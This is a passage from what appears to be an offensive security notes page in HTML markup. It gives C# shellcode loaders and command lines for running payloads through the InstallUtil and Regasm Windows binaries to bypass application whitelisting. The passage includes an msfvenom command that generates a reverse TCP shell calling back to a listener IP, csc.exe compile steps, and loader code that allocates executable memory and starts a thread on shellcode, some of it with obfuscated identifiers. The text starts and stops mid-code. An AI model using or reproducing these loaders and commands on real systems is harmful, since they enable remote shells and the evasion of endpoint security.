class=\"token class-name\">IntPtr</span> KqJNFlHpsKOV<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> EYBOArlCLAM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token function\">yrDaTlg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> QWKpWKhcs <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span>SHELLCODE</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token class-name\">IntPtr</span> AmnGaO <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>UInt32<span class=\"token punctuation\">)</span>QWKpWKhcs<span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">,</span> <span class=\"token number\">0x3000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Marshal<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>QWKpWKhcs<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>IntPtr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>AmnGaO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> QWKpWKhcs<span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token class-name\">IntPtr</span> oXmoNUYvivZlXj <span class=\"token operator\">=</span> IntPtr<span class=\"token punctuation\">.</span>Zero<span class=\"token punctuation\">;</span> <span class=\"token class-name\">UInt32</span> XVXTOi <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token class-name\">IntPtr</span> pAeCTfwBS <span class=\"token operator\">=</span> IntPtr<span class=\"token punctuation\">.</span>Zero<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">uint</span></span> BnhanUiUJaetgy<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">bool</span></span> iSdNUQK <span class=\"token operator\">=</span> <span class=\"token function\">VirtualProtect</span><span class=\"token punctuation\">(</span>AmnGaO<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">uint</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">uint</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">out</span> BnhanUiUJaetgy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>oXmoNUYvivZlXj <span class=\"token operator\">=</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> AmnGaO<span class=\"token punctuation\">,</span> pAeCTfwBS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">ref</span> XVXTOi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>oXmoNUYvivZlXj<span class=\"token punctuation\">,</span> <span class=\"token number\">0xFFFFFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"-280\"><a class=\"anchor\" href=\"#-280\">#</a> </h2>\n<h2 id=\"csc\"><a class=\"anchor\" href=\"#csc\">#</a> Csc</h2>\n<pre><code>&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp\n&gt;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\\Users\\y\\Desktop\\shell.exe /platform:x64 /unsafe C:\\Users\\y\\Desktop\\shell.cs\n&gt;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\y\\Desktop\\shell.exe\n</code></pre>\n<figure class=\"highlight csharp\"><figcaption data-lang=\"C#\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Net</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Diagnostics</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Reflection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Configuration<span class=\"token punctuation\">.</span>Install</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Runtime<span class=\"token punctuation\">.</span>InteropServices</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">System<span class=\"token punctuation\">.</span>ComponentModel<span class=\"token punctuation\">.</span>RunInstaller</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Sample</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">System<span class=\"token punctuation\">.</span>Configuration<span class=\"token punctuation\">.</span>Install<span class=\"token punctuation\">.</span>Installer</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">override</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Uninstall</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System<span class=\"token punctuation\">.</span>Collections<span class=\"token punctuation\">.</span>IDictionary</span> savedState<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Shellcode<span class=\"token punctuation\">.</span><span class=\"token function\">Exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Shellcode</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> shellcode <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\"><span class=\"token keyword\">byte</span></span><span class=\"token punctuation\">[</span><span class=\"token number\">510</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> SHELLCODE</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token class-name\">UInt32</span> funcAddr <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>UInt32<span class=\"token punctuation\">)</span>shellcode <span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>MEM_COMMIT<span class=\"token punctuation\">,</span> PAGE_EXECUTE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>Marshal<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>shellcode <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>IntPtr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>funcAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> shellcode <span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token class-name\">IntPtr</span> hThread <span class=\"token operator\">=</span> IntPtr<span class=\"token punctuation\">.</span>Zero<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token class-name\">UInt32</span> threadId <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token class-name\">IntPtr</span> pinfo <span class=\"token operator\">=</span> IntPtr<span class=\"token punctuation\">.</span>Zero<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>hThread <span class=\"token operator\">=</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> funcAddr<span class=\"token punctuation\">,</span> pinfo<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">ref</span> threadId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>hThread<span class=\"token punctuation\">,</span> <span class=\"token number\">0xFFFFFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">UInt32</span> MEM_COMMIT <span class=\"token operator\">=</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">UInt32</span> PAGE_EXECUTE_READWRITE <span class=\"token operator\">=</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UInt32</span> lpStartAddr<span class=\"token punctuation\">,</span><span class=\"token class-name\">UInt32</span> size<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> flAllocationType<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> flProtect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">bool</span></span> <span class=\"token function\">VirtualFree</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IntPtr</span> lpAddress<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token class-name\">UInt32</span> dwSize<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> dwFreeType<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">IntPtr</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token class-name\">UInt32</span> lpThreadAttributes<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token class-name\">UInt32</span> dwStackSize<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token class-name\">UInt32</span> lpStartAddress<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token class-name\">IntPtr</span> param<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token class-name\">UInt32</span> dwCreationFlags<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">ref</span> <span class=\"token class-name\">UInt32</span> lpThreadId</pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">bool</span></span> <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IntPtr</span> handle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token class-name\">IntPtr</span> hHandle<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token class-name\">UInt32</span> dwMilliseconds</pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">IntPtr</span> <span class=\"token function\">GetModuleHandle</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">string</span></span> moduleName</pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">GetProcAddress</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token class-name\">IntPtr</span> hModule<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">string</span></span> procName</pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">LoadLibrary</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token class-name\"><span class=\"token keyword\">string</span></span> lpFileName</pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"-281\"><a class=\"anchor\" href=\"#-281\">#</a> </h2>\n<h2 id=\"regasm\"><a class=\"anchor\" href=\"#regasm\">#</a> Regasm</h2>\n<pre><code>&gt;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\\Users\\y\\Desktop\\dll.dll  /unsafe C:\\Users\\y\\Desktop\\dll.cs\n&gt;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /u dll.dll\n</code></pre>\n<figure class=\"highlight csharp\"><figcaption data-lang=\"C#\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token namespace\">HYlDKsYF</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">kxKhdVzWQXolmmF</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">ServicedComponent</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t <span class=\"token keyword\">public</span> <span class=\"token function\">kxKhdVzWQXolmmF</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> Console<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"doge\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">ComRegisterFunction</span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> RegisterClass <span class=\"token punctuation\">(</span> <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> pNNHrTZzW <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t ZApOAKJKY<span class=\"token punctuation\">.</span><span class=\"token function\">QYJOTklTwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">ComUnregisterFunction</span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> UnRegisterClass <span class=\"token punctuation\">(</span> <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> pNNHrTZzW <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t ZApOAKJKY<span class=\"token punctuation\">.</span><span class=\"token function\">QYJOTklTwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t\t <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t\t <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ZApOAKJKY</span>  <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">HeapCreate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UInt32</span> FJyyNB<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> fwtsYaiizj<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> dHJhaXQiaqW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\t <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">HeapAlloc</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UInt32</span> bqtaDNfVCzVox<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> hjDFdZuT<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> JAVAYBFdojxsgo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\t <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">RtlMoveMemory</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UInt32</span> AQdEyOhn<span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> wknmfaRmoElGo<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> yRXPRezIkcorSOo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t\t <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">IntPtr</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UInt32</span> uQgiOlrrBaR<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> BxkWKqEKnp<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> lelfRubuprxr<span class=\"token punctuation\">,</span> <span 